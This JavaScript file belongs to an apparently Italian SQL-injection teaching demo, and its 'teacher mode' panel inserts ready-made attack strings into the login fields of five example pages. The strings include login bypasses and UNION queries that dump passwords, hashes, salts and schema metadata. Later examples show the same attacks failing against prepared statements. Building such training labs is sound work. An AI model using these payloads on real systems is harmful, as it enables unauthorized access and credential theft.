// =============================================================================
// payloads.js – Modalità Docente: payload di attacco per ogni esempio
// =============================================================================

const PAYLOADS = {
  "index.php": {
    title: "Esempio 1 — Password in chiaro, nessuna protezione",
    groups: [
      {
        label: "Accesso come utente generico",
        target: "password",
        entries: [
          { desc: "Bypass semplice con OR sempre vero", value: "x' OR 'x'='x" },
          { desc: "Bypass con commento finale",         value: "' OR '1'='1' -- x" },
        ]
      },
      {
        label: "Scegliere un utente specifico (campo username)",
        target: "username",
        entries: [
          { desc: "Primo utente (LIMIT 0,1)",  value: "' OR TRUE LIMIT 0,1 -- x" },
          { desc: "Secondo utente (LIMIT 1,1)", value: "' OR TRUE LIMIT 1,1 -- x" },
          { desc: "Terzo utente (LIMIT 2,1)",   value: "' OR TRUE LIMIT 2,1 -- x" },
        ]
      },
      {
        label: "Estrarre dati con UNION (campo password)",
        target: "password",
        entries: [
          { desc: "Leggere le password in chiaro",                    value: "' UNION SELECT password FROM users_ex1 -- x" },
          { desc: "Nome del database",                                value: "' UNION SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1,1 -- x" },
          { desc: "Prima tabella del DB",                             value: "' UNION SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = \"sql_injection_demo\" LIMIT 0,1 -- x" },
          { desc: "Colonne della tabella users_ex1 (cambia LIMIT)",   value: "' UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = \"sql_injection_demo\" AND TABLE_NAME = \"users_ex1\" LIMIT 0,1 -- x" },
        ]
      }
    ]
  },

  "example2.php": {
    title: "Esempio 2 — Hash MD5, ancora vulnerabile",
    groups: [
      {
        label: "Bypass login (campo password)",
        target: "password",
        entries: [
          { desc: "Bypass con OR sempre vero",   value: "x') OR 'x'=('x" },
          { desc: "Bypass con commento finale",  value: "') OR '1'='1' -- x" },
        ]
      },
      {
        label: "Scegliere un utente specifico (campo username)",
        target: "username",
        entries: [
          { desc: "Secondo utente (LIMIT 1,1)", value: "' OR TRUE LIMIT 1,1 -- x" },
        ]
      },
      {
        label: "Estrarre hash MD5 con UNION (campo password)",
        target: "password",
        entries: [
          { desc: "Leggere gli hash MD5 delle password", value: "') UNION SELECT password FROM users_ex2 -- x" },
        ]
      }
    ]
  },

  "example3.php": {
    title: "Esempio 3 — SHA2 + salt, ancora vulnerabile",
    groups: [
      {
        label: "Bypass login (campo password)",
        target: "password",
        entries: [
          { desc: "Bypass con OR sempre vero",  value: "'), 128) OR TRUE -- x" },
          { desc: "Secondo utente (LIMIT 1,1)", value: "'), 128) OR TRUE LIMIT 1,1 -- x" },
        ]
      },
      {
        label: "Estrarre dati con UNION (campo password)",
        target: "password",
        entries: [
          { desc: "Leggere gli hash SHA2",  value: "'), 128) UNION SELECT password FROM users_ex3 -- x" },
          { desc: "Leggere i salt",         value: "'), 128) UNION SELECT salt FROM users_ex3 -- x" },
        ]
      }
    ]
  },

  "example4.php": {
    title: "Esempio 4 — Prepared statements: attacchi neutralizzati",
    groups: [
      {
        label: "Prova gli stessi attacchi degli esempi precedenti",
        target: "password",
        entries: [
          { desc: "Bypass esempio 1 (non funziona)", value: "' OR '1'='1' -- x" },
          { desc: "Bypass esempio 3 (non funziona)", value: "'), 128) OR TRUE -- x" },
          { desc: "UNION injection (non funziona)",  value: "' UNION SELECT password FROM users_ex3 -- x" },
        ]
      }
    ]
  },

  "example5.php": {
    title: "Esempio 5 — Prepared statements + bcrypt: soluzione completa",
    groups: [
      {
        label: "Prova gli stessi attacchi degli esempi precedenti",
        target: "password",
        entries: [
          { desc: "Bypass (non funziona)",          value: "' OR '1'='1' -- x" },
          { desc: "UNION injection (non funziona)", value: "' UNION SELECT password FROM users_ex4 -- x" },
        ]
      }
    ]
  }
};

// =============================================================================
// Logica toggle e rendering
// =============================================================================

const STORAGE_KEY = "docente_mode";

function isDocenteMode() {
  return localStorage.getItem(STORAGE_KEY) === "1";
}

function setDocenteMode(active) {
  localStorage.setItem(STORAGE_KEY, active ? "1" : "0");
}

// Inserisce il payload nel campo corretto e triggera gli eventi MDB
function insertPayload(target, value) {
  const field = document.getElementById(target === "username" ? "username" : "password");
  if (!field) return;
  field.value = value;
  // Trigger MDB floating label update
  field.dispatchEvent(new Event("input", { bubbles: true }));
  field.focus();
}

// Costruisce il pannello dei payload per la pagina corrente
function buildPayloadPanel() {
  const page = window.location.pathname.split("/").pop() || "index.php";
  const data = PAYLOADS[page];
  if (!data) return null;

  const panel = document.createElement("div");
  panel.id = "docente-panel";
  panel.className = "docente-panel mt-3";

  let html = `<div class="docente-panel-header">
    <i class="fas fa-chalkboard-teacher me-2"></i>
    <strong>Modalità Docente</strong> — ${data.title}
  </div>`;

  for (const group of data.groups) {
    html += `<div class="docente-group">
      <div class="docente-group-label">${group.label}</div>`;
    for (const entry of group.entries) {
      const escapedValue = entry.value.replace(/'/g, "\\'");
      const targetLabel = group.target === "username"
        ? '<span class="badge-target badge-username">username</span>'
        : '<span class="badge-target badge-password">password</span>';
      html += `
        <div class="docente-entry" onclick="insertPayload('${group.target}', '${escapedValue}')">
          ${targetLabel}
          <span class="docente-desc">${entry.desc}</span>
          <code class="docente-code">${entry.value}</code>
        </div>`;
    }
    html += `</div>`;
  }

  html += `</div>`;
  panel.innerHTML = html;
  return panel;
}

function applyDocenteMode() {
  const btn    = document.getElementById("toggle-docente");
  const active = isDocenteMode();

  if (btn) {
    btn.innerHTML = active
      ? '<i class="fas fa-eye-slash me-1"></i>Nascondi soluzioni'
      : '<i class="fas fa-chalkboard-teacher me-1"></i>Mostra soluzioni';
    btn.className = active
      ? "btn btn-warning btn-sm me-3"
      : "btn btn-outline-warning btn-sm me-3";
  }

  // Rimuovi pannello esistente se presente
  const existing = document.getElementById("docente-panel");
  if (existing) existing.remove();

  if (active) {
    const panel = buildPayloadPanel();
    if (panel) {
      // Inserisci dopo la tabella credenziali
      const tableResponsive = document.querySelector(".table-responsive");
      if (tableResponsive) {
        tableResponsive.appendChild(panel);
      }
    }
  }
}

function toggleDocente() {
  setDocenteMode(!isDocenteMode());
  applyDocenteMode();
}

document.addEventListener("DOMContentLoaded", applyDocenteMode);
